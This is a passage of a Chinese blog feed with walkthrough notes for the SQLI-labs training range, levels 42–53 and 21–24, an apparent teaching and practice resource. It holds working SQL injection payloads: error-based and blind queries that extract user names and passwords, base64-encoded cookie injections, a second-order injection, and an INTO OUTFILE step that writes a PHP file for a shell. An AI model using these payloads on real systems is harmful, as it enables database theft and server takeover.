src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/04.png" alt="Less-42"></p><p>同理这里也可以进行盲注和堆叠查注入，这里不再赘述。</p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>username=(&#39;$username&#39;)</code></td></tr></tbody></table><p>和 Less-42 的利用方式一致，这里只是拼接方式不一样而已，不再赘述。</p><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、布尔盲注、延时盲注、堆叠注入</td><td><code>username=&#39;$username&#39;</code></td></tr></tbody></table><p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、布尔盲注、延时盲注、堆叠注入</td><td><code>username=(&#39;$username&#39;)</code></td></tr></tbody></table><p>与 Less-43 闭合方式一致，只是这里少了报错注入的利用方法。</p><h2 id="Less-46-order-by后的注入"><a href="#Less-46-order-by后的注入" class="headerlink" title="Less-46(order by后的注入)"></a>Less-46(order by后的注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>ORDER BY $id</code></td></tr></tbody></table><pre><code class="hljs Php"><span class="hljs-comment"># GET 方式获取 sort 参数</span><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sort&#x27;</span>];<span class="hljs-comment"># 直接将 id 带入 SQL 中</span><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users ORDER BY <span class="hljs-subst">$id</span>&quot;</span>;<span class="hljs-keyword">if</span> 查询成功：    输出查询信息<span class="hljs-keyword">else</span>：    print_r(mysql_error());</code></pre><p>order by 不同于 where 后的注入点，不能使用 union 等进行注入。注入方式十分灵活，下面在本关来详细讲解一下。</p><h3 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h3><ul><li><strong>升序和降序验证</strong></li></ul><pre><code class="hljs Bash"><span class="hljs-comment"># 升序排序</span>?sort=1 asc<span class="hljs-comment"># 降序排序</span>?sort=1 dasc</code></pre><ul><li><strong>rand() 验证</strong></li></ul><p>rand(ture) 和 rand(false) 的结果是不一样的</p><pre><code class="hljs Bash">?sort=rand(<span class="hljs-literal">true</span>)?sort=rand(<span class="hljs-literal">false</span>)</code></pre><p>所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload</p><p>此外 rand() 结果是一直都是随机的</p><pre><code class="hljs Bash">?sort=rand()?sort=1 and rand()</code></pre><ul><li><strong>延时验证</strong></li></ul><pre><code class="hljs bash">?sort=sleep(1)?sort=(sleep(1))?sort=1 and sleep(1)</code></pre><p>这种方式均可以延时，延时的时间为 (行数*1) 秒</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select group_concat(schema_name)from information_schema.schemata)),0)</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/05.png" alt="Less-46">可见一次把数据库名爆不完，所以可以采用<code>limit</code>语句控制一次爆库名的个数</p><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select schema_name from information_schema.schemata limit 4,1)),0)</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/06.png" alt="Less-46"></p><h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;)),0)</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/07.png" alt="Less-46"></p><h4 id="爆users表的表列"><a href="#爆users表的表列" class="headerlink" title="爆users表的表列"></a>爆<code>users</code>表的表列</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),0)</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/08.png" alt="Less-46"></p><h4 id="爆users表的数据"><a href="#爆users表的数据" class="headerlink" title="爆users表的数据"></a>爆<code>users</code>表的数据</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select concat_ws(&#39;~&#39;,id,username,password)from security.users limit 0,1)),0)</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/09.png" alt="Less-46"></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>数据库第 1 位为：s</p><pre><code class="hljs sql">?sort=rand(left(database(),1)&gt;&#x27;r&#x27;)?sort=rand(left(database(),1)&gt;&#x27;s&#x27;)?sort=rand(left(database(),2)&gt;&#x27;sd&#x27;)?sort=rand(left(database(),2)&gt;&#x27;se&#x27;)</code></pre><h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p><pre><code class="hljs sql">?sort=rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))?sort=rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))</code></pre><h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><p><strong>将查询结果导入到文件中</strong>：</p><pre><code class="hljs Sql">?sort=1 into outfile &quot;D:/phpstudy_pro/WWW/sqli.pl/Less-46/less46.txt&quot;</code></pre><p>如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。</p><p><strong>利用导出文件 getshell</strong>：</p><p>注入天书里面提供了 lines terminated by 姿势用于 order by 的情况来 getsgell：</p><pre><code class="hljs Payload">?sort&#x3D;1 into outfile &quot;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;sqli.pl&#x2F;Less-46&#x2F;shell.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e</code></pre><p>3c3f70687020706870696e666f28293b3f3e 是 <code>&lt;php phpinfo();&gt;</code> 的十六进制编码。</p><p>来查看下写入的文件内容是啥样子的：</p><pre><code class="hljs Bash">1DumbDumb&lt;?php phpinfo();?&gt;2AngelinaI-kill-you&lt;?php phpinfo();?&gt;3Dummyp@ssword&lt;?php phpinfo();?&gt;4securecrappy&lt;?php phpinfo();?&gt;5stupidstupidity&lt;?php phpinfo();?&gt;6supermangenious&lt;?php phpinfo();?&gt;7batmanmob!le&lt;?php phpinfo();?&gt;8adminadmin&lt;?php phpinfo();?&gt;9admin1admin1&lt;?php phpinfo();?&gt;10admin2admin2&lt;?php phpinfo();?&gt;11admin3admin3&lt;?php phpinfo();?&gt;12dhakkandumbo&lt;?php phpinfo();?&gt;14admin4admin4&lt;?php phpinfo();?&gt;15helloworld&lt;?php phpinfo();?&gt;</code></pre><p>浏览器访问测试看看：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/10.png" alt="Less-46"></p><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-46 相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。</p><pre><code class="hljs sql">?sort=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">0</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-46 相比少了报错注入，布尔、延时盲注依然可以正常使用，这里不再过多演示了。</p><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，这里不再过多演示了。</p><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-46 相比，查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入，在注入方面会更加灵活。堆叠注入的话这里不再演示，详细细节可以参考 Less-38 的堆叠注入的姿势。</p><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-50 相比只是拼接方式发生了变化，实际注入的时候只需做一下对应的闭合即可。</p><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p>]]></content>
    
    
    <categories>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>sqli lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLI labs 靶场笔记之高级注入姿势 21-37 关</title>
    <link href="/p/4c595109.html"/>
    <url>/p/4c595109.html</url>
    
    <content type="html"><![CDATA[<h1 id="高级注入姿势-21-37-关"><a href="#高级注入姿势-21-37-关" class="headerlink" title="高级注入姿势 21-37 关"></a>高级注入姿势 21-37 关</h1><h2 id="Less-21-Cookie-Base64编码注入"><a href="#Less-21-Cookie-Base64编码注入" class="headerlink" title="Less-21(Cookie Base64编码注入)"></a>Less-21(Cookie Base64编码注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=(&#39;$cookee&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> cookie 中不存在 uname 参数:      输出了一堆无用的信息    <span class="hljs-keyword">if</span> 提交了 uname 和 passwd:        <span class="hljs-comment"># 进行过滤</span>        <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);        <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;        <span class="hljs-keyword">if</span> 有查询结果:            <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>            setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, base64_encode(<span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>]), time()+<span class="hljs-number">3600</span>);            <span class="hljs-keyword">else</span>:            print_r(mysql_error());<span class="hljs-keyword">else</span>:    <span class="hljs-keyword">if</span> POST 数据里面没有 submit 参数:                 <span class="hljs-comment"># 对 cookee 进行 base64 解密</span>        <span class="hljs-variable">$cookee</span> = base64_decode(<span class="hljs-variable">$cookee</span>);        <span class="hljs-comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span>        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;        <span class="hljs-keyword">if</span> 查询无结果:            输出 mysql_error()        <span class="hljs-keyword">if</span> 有结果:            输出查询的信息    <span class="hljs-keyword">else</span>:        <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>        setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, base64_encode(<span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>]), time()<span class="hljs-number">-3600</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>从源码中分析可得，和 Less-20 基本上是一毛一样，只是 Coojie 这里是经过 base64 加密的，所以我们只需要传入加密后的 payload 给 cookie 的 uname 即可，下面就只用报错注入来简单演示一下吧：</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-21/index.php</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">Cache-Control</span>: max-age=0<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="hljs-attribute">Referer</span>: http://sqli.pl/Less-21/<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9<span class="hljs-attribute">Cookie</span>: uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VybmFtZSBmcm9tIHVzZXJzIGxpbWl0IDEsMSksMHg3ZSksMSkj<span class="hljs-attribute">Connection</span>: close</code></pre><p>Cookie 的 uname 参数 Base64 解码为：</p><pre><code class="hljs sql">admin&#x27;) and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span></code></pre><p>联合注入</p><pre><code class="hljs sql">-admin&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">#</span></code></pre><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&quot;$cookee&quot;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 先双引号 然后直接拼接到SQL语句中</span><span class="hljs-variable">$cookee1</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span>. <span class="hljs-variable">$cookee</span>. <span class="hljs-string">&#x27;&quot;&#x27;</span>;    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=<span class="hljs-subst">$cookee1</span> LIMIT 0,1&quot;</span>;</code></pre><p>可以发现和 Less-21 相比，只是拼接方式不一样，其他都是一致的，这里就不再啰嗦了。</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-22/index.php</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">Pragma</span>: no-cache<span class="hljs-attribute">Cache-Control</span>: no-cache<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="hljs-attribute">Referer</span>: http://sqli.pl/Less-22/<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9<span class="hljs-attribute">Cookie</span>: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLChzZWxlY3QgZ3JvdXBfY29uY2F0KHVzZXJuYW1lLCc6JyxwYXNzd29yZCkgZnJvbSB1c2VycykgIw==<span class="hljs-attribute">Connection</span>: close</code></pre><p>Cookie 的 uname 参数 Base64 解码为：</p><pre><code class="hljs sql">-admin&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">#</span></code></pre><h2 id="Less-23-过滤-、–注释"><a href="#Less-23-过滤-、–注释" class="headerlink" title="Less-23(过滤#、–注释)"></a>Less-23(过滤#、–注释)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 获取到 id 的值</span><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-comment"># 过滤了 id 中的 # 和 -- 然后 替换为 空</span><span class="hljs-variable">$reg</span> = <span class="hljs-string">&quot;/#/&quot;</span>;<span class="hljs-variable">$reg1</span> = <span class="hljs-string">&quot;/--/&quot;</span>;<span class="hljs-variable">$replace</span> = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-variable">$reg1</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 使用单引号拼接 SQL</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> 有查询结果:    输出查询信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p><strong>过滤了注释符号</strong>，但是这里还可以考虑使用闭合方式来进行注入，下面直接使用最简单的联合查询注入吧：</p><p>Payload</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><h2 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24(二次注入)"></a>Less-24(二次注入)</h2><p>一个经典的二次注入场景，所以下面来单个理一下源码。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><ul><li><code>index.php</code></li></ul><p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，具体的界面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/01.png" alt="Less-24(二次注入)"></p><p>提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。</p><p><code>忘记密码</code>：左下角的忘记密码选项提示：如果你忘记密码 请 hack it</p><p><code>新建用户</code>：右下角新建用户可以新建一个自己的用户</p><ul><li><code>failed.php</code></li></ul><p>检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php</p><ul><li><code>forgot_password.php</code></li></ul><p>简单提示：如果你忘记密码 请 hack it</p><ul><li><code>Logged-in.php</code></li></ul><p>登录后的信息展示，显示登录名称并且提供了修改密码的表单</p><ul><li><code>new_user.php</code></li></ul><p>创建新用户的表单页面，本文件主要存放前段代码。</p><ul><li><code>login_create.php</code></li></ul><p>创建新用户的后端代码，下面来简单理一下代码的流程：</p><pre><code class="hljs Php"><span class="hljs-comment"># 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义</span>username=  mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ;<span class="hljs-variable">$pass</span>= mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<span class="hljs-variable">$re_pass</span>= mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);<span class="hljs-comment"># 查询当前用户信息</span><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(*) from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;如果当前用户已经存在 无法注册<span class="hljs-keyword">if</span> 两次输入密码一致：  <span class="hljs-comment"># 将记录插入数据库中</span>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into users ( username, password) values(\&quot;<span class="hljs-subst">$username</span>\&quot;, \&quot;<span class="hljs-subst">$pass</span>\&quot;)&quot;</span>;    查询完成后 重定向到首页<span class="hljs-keyword">else</span>:    提示两次输入密码不一致</code></pre><ul><li><code>login.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># 登录用户名和密码都被过滤了</span><span class="hljs-variable">$username</span> = mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<span class="hljs-variable">$password</span> = mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>]);<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;</code></pre><ul><li><code>pass_change.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-keyword">if</span> 检测未登录：    重定向到首页<span class="hljs-keyword">if</span> 检测到提交表单：  <span class="hljs-comment"># 对 pass 都进行了过滤</span>  <span class="hljs-variable">$username</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>];    <span class="hljs-variable">$curr_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;current_password&#x27;</span>]);    <span class="hljs-variable">$pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);    <span class="hljs-variable">$re_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);    <span class="hljs-keyword">if</span> 两次密码一致:        <span class="hljs-comment"># 直接将 username 拼接到 SQL 语句</span>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;    <span class="hljs-keyword">else</span>:        提示密码不一致 并重定向到 fail.php</code></pre><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>从代码上来看貌似都被转义了，乍一看是成功注入的。实际上的确不能使用常规的思路来进行注入，因为这题是二次注入，ISCC 2019 当时使用这题的考查点是修改掉 admin 用户的密码，然后再登录即可。假设不知道 admin 用户的情况下，想要修改掉 admin 用户的密码的话，这里就使用的是二次注入的姿势了。</p><p><strong>二次注入</strong> 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。</p><p>先看创建用户的地方：</p><pre><code class="hljs php">username =  mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ;</code></pre><p>username 被 <code>mysql_escape_string</code> 函数过滤了，该函数的作用如下：</p><table><thead><tr><th>危险字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>再看下更新密码的核心语句：</p><pre><code class="hljs Sql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;$username&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;$curr_pass&#x27;</span></code></pre><p>这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：<code>admin&#39;#</code>，那么此时的完整语句就为：</p><pre><code class="hljs Sql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span><span class="hljs-comment"># and 